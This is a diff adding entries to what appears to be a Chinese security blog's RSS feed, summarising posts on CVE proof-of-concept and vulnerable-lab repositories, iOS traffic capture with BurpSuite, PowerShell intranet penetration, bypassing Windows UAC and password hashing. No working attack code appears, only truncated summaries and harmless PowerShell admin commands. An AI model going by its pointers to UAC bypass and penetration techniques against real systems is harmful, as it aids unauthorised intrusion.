+      <link>/hacker/%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/</guid>
+      <description>slowmist/Knowledge-Base: Knowledge Base 慢雾安全团队知识库 CVE poc Vulnerability Labs for security analysis github.com/nixawk/labs github.com/qazbnm456/awesome-cve-poc github.com/qazbnm456/awesome-web-security 靶场 github.com/vulhub/vulhub github.com/Medicean/VulApps github.com/tengzhangchao/Sec-Box paper.seebug.org Websec-网络安全导航 安全导航 渗透导航师 [](http://map.ipviking.com/) [](http://www.digitalattackmap.com) https://github.com/Hack-with-Github 知道创宇 知道创宇研发技能表v2.2</description>
+    </item>
+    
+    <item>
+      <title>iOS抓包（使用BurpSuite和tcpdump）</title>
+      <link>/hacker/debug-ios-traffic/</link>
+      <pubDate>Fri, 25 Dec 2015 08:52:52 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/debug-ios-traffic/</guid>
+      <description>&lt;h2 id=&#34;introduce&#34;&gt;Introduce&lt;/h2&gt;
+
+&lt;p&gt;开发过程中我们经常会需要对网络请求抓包，本次介绍的是使用BurpSuite抓取HTTP/HTTPS包，以及不越狱使用tcpdump抓取iPhone的网络包。&lt;/p&gt;
+
+&lt;h2 id=&#34;使用burpsuite对http-https抓包&#34;&gt;使用BurpSuite对HTTP/HTTPS抓包&lt;/h2&gt;
+
+&lt;p&gt;开发中我们经常会需要对HTTP/HTTPS请求进行抓包。&lt;br /&gt;
+抓包实际上是在中间机器开了一个代理服务，让需要抓包的请求经过代理，我们就可以看到这些请求了。本质上是中间人攻击。&lt;br /&gt;
+BurpSuite是一个常用的调试工具。&lt;/p&gt;
+
+&lt;h4 id=&#34;1-下载burpsuite&#34;&gt;1. 下载BurpSuite&lt;/h4&gt;
+
+&lt;p&gt;从&lt;a href=&#34;http://portswigger.net/burp/download.html&#34; target=&#34;_blank&#34;&gt;BurpSuite&lt;/a&gt;官网下载jar包，右键点击，运行：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://openfibers.github.io/images/blog/ios_burp/BurpSuite_1.jpg&#34; alt=&#34;&#34; title=&#34;947&#34; /&gt;&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>powershell内网渗透</title>
+      <link>/windows/powershell/powershell%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link>
+      <pubDate>Fri, 25 Dec 2015 08:52:52 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/windows/powershell/powershell%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
+      <description>$adapter=Get-WmiObject Win32_NetworkAdapterConfiguration| Where-Object { $_.Description -match &amp;quot;Juniper Network Connect Virtual Adapter&amp;quot;} $Gateway=$adapter.IPaddress[0] $if=$adapter.InterfaceIndex route add 192.168.1.3 mask 255.255.255.255 $Gateway metric 1 $if 0x01 Powershell Powershell 启动 Powershell 查看版本 $PSVersionTable.PSVersion 以管理员启动Powershell Start-Process notepad -Verb runas Start-Process &amp;quot;$PSHOME\powershell.exe&amp;quot; -Verb runas 具有一致的命名规范，都采用</description>
+    </item>
+    
+    <item>
+      <title>使用Powershell Bypass UAC</title>
+      <link>/hacker/%E4%BD%BF%E7%94%A8powershell-bypass-uac/</link>
+      <pubDate>Fri, 25 Dec 2015 08:52:52 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/%E4%BD%BF%E7%94%A8powershell-bypass-uac/</guid>
+      <description>0x00 简介 UAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行</description>
+    </item>
+    
+    <item>
+      <title>SSL-TLS协议</title>
+      <link>/hacker/crypto-ssl-tls/</link>
+      <pubDate>Wed, 02 Dec 2015 15:09:22 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/crypto-ssl-tls/</guid>
+      <description>精华 SSL/TLS协议 HASH 消息摘要算法 消息摘要算法包括MD(Message Digest 消息摘要算法)，SHA(Secure Hash Algorithm 安全散列算法)和MAC(M</description>
+    </item>
+    
+    <item>
+      <title>Web前端慢加密</title>
+      <link>/hacker/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-web%E5%89%8D%E7%AB%AF%E6%85%A2%E5%8A%A0%E5%AF%86/</link>
+      <pubDate>Wed, 02 Dec 2015 15:09:22 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-web%E5%89%8D%E7%AB%AF%E6%85%A2%E5%8A%A0%E5%AF%86/</guid>
+      <description>0x00 前言 天下武功，唯快不破。但密码加密不同。算法越快，越容易破。 0x01 暴力破解 密码破解，就是把加密后的密码还原成明文密码。似乎有不少方法，但最终都</description>
+    </item>
+    
+  </channel>
+</rss>
